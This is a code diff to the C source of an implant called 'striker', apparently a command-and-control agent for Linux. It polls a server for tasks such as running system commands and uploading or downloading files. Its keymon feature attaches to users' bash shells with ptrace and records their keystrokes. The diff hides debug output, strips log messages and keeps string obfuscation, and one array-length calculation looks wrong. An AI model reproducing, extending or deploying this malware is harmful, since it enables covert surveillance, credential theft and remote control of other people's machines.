@@ -8,7 +8,7 @@
 #include "striker.h"
 
 // Set to non-zero value for debug outputs.
-#define STRIKER_DEBUG 1
+#define STRIKER_DEBUG
 // Size of agent UID
 #define AGENT_UID_SIZE 17
 // Max task result size in bytes
@@ -46,10 +46,9 @@ CURL *init_curl(const char *path, buffer *buff){
   
   CURL *curl = curl_easy_init();
   if (!curl){
-    if (STRIKER_DEBUG){
-      char error[] = "[OBFS_ENC][-] Error initializing curl!";
-      fprintf(stderr, "%s\n", obfs_decode(error));
-    }
+    #ifdef STRIKER_DEBUG
+      fprintf(stderr, "[-]Error initializing curl!\n");
+    #endif
     exit(EXIT_FAILURE);
   }
   char *url = malloc(URL_SIZE);
@@ -198,9 +197,7 @@ void keymon(session *striker, task *tsk){
     close(kb);
   }
 
-  printf("[*] keymon: waiting for proc watcher...\n");
   pthread_join(tid, NULL);
-  printf("[+] keymon: proc watcher quit...\n");
 
   queue_seek(km_proc_dumps, 0);
   while (!queue_exhausted(km_proc_dumps)){
@@ -220,6 +217,7 @@ void keymon(session *striker, task *tsk){
     free(pid);
   }
   queue_free(km_proc_dumps, 0);
+  queue_free(km_proc_arg, 0);
   
   cJSON_AddItemToObject(tsk->result, strs[4], cJSON_CreateString(tsk->uid));
   if (count > 0){
@@ -238,12 +236,12 @@ void keymon(session *striker, task *tsk){
 
 void *keymon_proc_watch(void *ptr){
 
-  printf("[*] Watching processes...\n");
   char strs[][40] = {"[OBFS_ENC]/proc", "[OBFS_ENC]/proc/%d/cmdline"};
   for (int i = 0; i < 2; i++)
     obfs_decode(strs[i]);
-  char targets[][50] = {"[OBFS_ENC]-bash", "[OBFS_ENC]bash" , "[OBFS_ENC]/bin/bash", "[OBFS_ENC]/usr/bin/bash", "[OBFS_ENC]sh", "[OBFS_ENC]/bin/sh", "[OBFS_ENC]/usr/bin/sh"};
-  for (int i = 0; i < 7; i++)
+  char targets[][30] = {"[OBFS_ENC]-bash", "[OBFS_ENC]bash" , "[OBFS_ENC]/bin/bash", "[OBFS_ENC]/usr/bin/bash"};
+  int targets_len = sizeof(targets) / 50;
+  for (int i = 0; i < targets_len; i++)
     obfs_decode(targets[i]);
   queue *q = (queue *)ptr;
   session *striker = queue_get(q);
@@ -255,10 +253,8 @@ void *keymon_proc_watch(void *ptr){
   while (attached_count < KEYMON_MAX_PROCS && time(NULL) < *end_time){
     struct dirent *dir;
     DIR *d = opendir(strs[0]);
-    if (!d){
-      printf("[+] Error listing procs!\n");
+    if (!d)
       break;
-    }
     while ((dir = readdir(d)) != NULL && attached_count < KEYMON_MAX_PROCS){
       if (dir->d_type == DT_DIR){
         pid_t *pid = malloc(sizeof(pid_t));
@@ -278,7 +274,6 @@ void *keymon_proc_watch(void *ptr){
           free(pid);
           continue;
         }
-        printf("[+] Processing process: %d\n", *pid);
         // /proc/<pid>/cmdline file separates executable and args with null bytes, so we need this form of matching to seperate shell sessions from script invocations like: /bin/bash script.sh
         char *filename = malloc(50);
         memset(filename, 0, 50);
@@ -293,12 +288,11 @@ void *keymon_proc_watch(void *ptr){
         int n = read(fd, proc_name, 50);
         if (n == 0 || n == -1){
           close(fd); free(filename); free(proc_name); free(pid);
-          printf("[-] Unable to read!\n");
           continue;
         }
         char *buff = malloc(50);
         int valid = 0;
-        for (int i = 0; i < 7; i++){
+        for (int i = 0; i < targets_len; i++){
           memset(buff, 0, 50);
           strncpy(buff, targets[i], strlen(targets[i]));
           if (!memcmp(buff, proc_name, 50)){
@@ -311,7 +305,6 @@ void *keymon_proc_watch(void *ptr){
           free(pid);
           continue;
         }
-        printf("[*] Creating thread for %d...\n", *pid);
         queue *data = queue_init(KEYMON_MAX_KEYSTROKES + 3);
         queue_put(data, striker);
         queue_put(data, end_time);
@@ -325,10 +318,8 @@ void *keymon_proc_watch(void *ptr){
     closedir(d);
     sleep(KEYMON_PROC_DELAY);
   }
-  printf("[+] proc watcher: waiting...\n");
   for (int i = 0; i < attached_count; i++)
     pthread_join(tids[i], NULL);
-  printf("[+] proc watcher: childs closed...\n");
   pthread_exit(NULL);
 }
 
@@ -339,10 +330,8 @@ void *keymon_proc_attach(void *ptr){
   time_t *end_time = queue_get(q);
   pid_t *pid = queue_get(q);
   struct user_regs_struct regs;
-  printf("[*] Attaching to PID: %d\n", *pid);
   if (ptrace(PTRACE_ATTACH, *pid, NULL, NULL))
     pthread_exit(NULL);
-  printf("[+] Attached to %d\n", *pid);
   ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACESYSGOOD);
   while (striker->abort == 0 && queue_full(q) == 0 && time(NULL) < *end_time){
     ptrace(PTRACE_SYSCALL, *pid, 0, 0);
@@ -359,18 +348,14 @@ void *keymon_proc_attach(void *ptr){
     if (regs.orig_rax == 0 && regs.rdi == 0){
       unsigned char *val = malloc(sizeof(unsigned char));
       *val = (unsigned char)ptrace(PTRACE_PEEKDATA, *pid, regs.rsi, 0);
-      if (*val != 0){
-        printf("key: 0x%02x\n", *val);
+      if (*val != 0)
         queue_put(q, val);
-      }else{
+      else
         free(val);
-      }
     }
   }
   complete:
-    printf("[+] %d closing...\n", *pid);
     ptrace(PTRACE_DETACH, *pid, NULL, NULL);
-    printf("[+] %d closed!\n", *pid);
     pthread_exit(NULL);
 }
 
@@ -402,10 +387,9 @@ void *task_executor(void *ptr){
   task_wrapper *tskw = (task_wrapper *)ptr;
   session *striker = tskw->striker;
   task *tsk = tskw->tsk;
-  if (STRIKER_DEBUG){
-    char msg[] = "[OBFS_ENC][*] Executing task: %s\n";
-    printf(obfs_decode(msg), tsk->uid);
-  }
+  #ifdef STRIKER_DEBUG
+    printf("[*] Executing task: %s\n", tsk->uid);
+  #endif
   cJSON *data = tsk->data;
   buffer *result_buff = create_buffer(0);
   char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]writedir", "[OBFS_ENC]keymon", "[OBFS_ENC]abort"};
@@ -495,15 +479,16 @@ void *task_executor(void *ptr){
   }
 
   complete: ; // empty statement to appease GCC
-    char strs[][40] = {"[OBFS_ENC][+] Task completed: %s\n", "[OBFS_ENC]uid", "[OBFS_ENC]result"};
-    for (int i = 0; i < 3; i++)
+    char strs[][20] = {"[OBFS_ENC]uid", "[OBFS_ENC]result"};
+    for (int i = 0; i < 2; i++)
       obfs_decode(strs[i]);
-    if (STRIKER_DEBUG)
-      printf(strs[0], tsk->uid);    
+    #ifdef STRIKER_DEBUG
+      printf("[+] Task completed: %s\n", tsk->uid);
+    #endif
     if (!tsk->completed){    
       char *res = buffer_to_string(result_buff);
-      cJSON_AddItemToObject(tsk->result, strs[1], cJSON_CreateString(tsk->uid));
-      cJSON_AddItemToObject(tsk->result, strs[2], cJSON_CreateString(res));
+      cJSON_AddItemToObject(tsk->result, strs[0], cJSON_CreateString(tsk->uid));
+      cJSON_AddItemToObject(tsk->result, strs[1], cJSON_CreateString(res));
       free(res);
       tsk->completed = 1;
     }
@@ -518,10 +503,8 @@ void start_session(){
   obfs_decode(BASE_URL);
   char strs[][50] = {
     "[OBFS_ENC]/tmp/", "[OBFS_ENC]Connection: close", "[OBFS_ENC]Content-Type: application/json",
-    "[OBFS_ENC]/agent/init", "[OBFS_ENC][-] Error calling home: %s\n",
-    "[OBFS_ENC][-] Error parsing config: %s\n", "[OBFS_ENC]uid", "[OBFS_ENC]delay",
-    "[OBFS_ENC]/agent/tasks/%s", "[OBFS_ENC][+] Task results: %s\n", "[OBFS_ENC][+] Queued task completed: %s\n", "[OBFS_ENC][+] Sending results for %ld tasks\n"};
-  for (int i = 0; i < 12; i++)
+    "[OBFS_ENC]/agent/init", "[OBFS_ENC]uid", "[OBFS_ENC]delay", "[OBFS_ENC]/agent/tasks/%s"};
+  for (int i = 0; i < 7; i++)
     obfs_decode(strs[i]);
   // Default session setup.
   session *striker = malloc(sizeof(session));
@@ -552,8 +535,9 @@ void start_session(){
     res = curl_easy_perform(curl);
     curl_easy_cleanup(curl);
     if (res != CURLE_OK){
-      if (STRIKER_DEBUG)
-        fprintf(stderr, strs[4], curl_easy_strerror(res));
+      #ifdef STRIKER_DEBUG
+        fprintf(stderr, "[-] Error calling home: %s\n", curl_easy_strerror(res));
+      #endif
       sleep(striker->delay);
       continue;
     }
@@ -564,23 +548,24 @@ void start_session(){
   char *config_str = buffer_to_string(body);
   cJSON *config = cJSON_Parse(config_str);
   if (!config){
-    if (STRIKER_DEBUG){
+    #ifdef STRIKER_DEBUG
       const char *error = cJSON_GetErrorPtr();
-      fprintf(stderr, strs[5], error);
-    }
+      fprintf(stderr, "[-] Error parsing config: %s\n", error);
+    #endif
     goto end;
   }
-  tmp = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(config, strs[6]));
+  tmp = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(config, strs[4]));
   strncpy(striker->uid, tmp, AGENT_UID_SIZE - 1);
   // Todo: remove this. Implant patcher should be the one defining delay, which can also be changed by operator after callback.
-  striker->delay = (unsigned short)cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(config, strs[7]));
-  if (STRIKER_DEBUG)
-    printf("%s\n", config_str);
+  striker->delay = (unsigned short)cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(config, strs[5]));
+  #ifdef STRIKER_DEBUG
+    printf("[*] Agent config: %s\n", config_str);
+  #endif
   cJSON_Delete(config);
   free(config_str);
 
   char *tasksURL = malloc(URL_SIZE);
-  snprintf(tasksURL, URL_SIZE, strs[8], striker->uid);
+  snprintf(tasksURL, URL_SIZE, strs[6], striker->uid);
   queue *tasks_queue = queue_init(MAX_TASKS_QUEUE);
   queue *completed_tasks = queue_init(MAX_TASKS_QUEUE);
   while (!striker->abort){
@@ -602,8 +587,9 @@ void start_session(){
       // Build result and send results.
       queue_seek(completed_tasks, 0);
       if (completed_tasks->count > 0){
-        if (STRIKER_DEBUG)
-          printf(strs[11], completed_tasks->count);
+        #ifdef STRIKER_DEBUG
+          printf("[+] Sending results for %ld tasks\n", completed_tasks->count);
+        #endif
         cJSON *results = cJSON_CreateArray();
         while (!queue_exhausted(completed_tasks)){
           task *tsk = queue_get(completed_tasks);
@@ -618,8 +604,9 @@ void start_session(){
           res = curl_easy_perform(curl);
           curl_easy_cleanup(curl);
           if (res != CURLE_OK){
-            if (STRIKER_DEBUG)
-              fprintf(stderr, strs[4], curl_easy_strerror(res));
+            #ifdef STRIKER_DEBUG
+              fprintf(stderr, "[-] Error calling home: %s\n", curl_easy_strerror(res));
+            #endif
             sleep(striker->delay);
             continue;
           }
@@ -642,8 +629,9 @@ void start_session(){
     res = curl_easy_perform(curl);
     curl_easy_cleanup(curl);
     if (res != CURLE_OK){
-      if (STRIKER_DEBUG)
-        fprintf(stderr, strs[4], curl_easy_strerror(res));
+      #ifdef STRIKER_DEBUG
+        fprintf(stderr, "[-] Error calling home: %s\n", curl_easy_strerror(res));
+      #endif
       continue;
     }
     // Parse tasks and spawn execution threads.
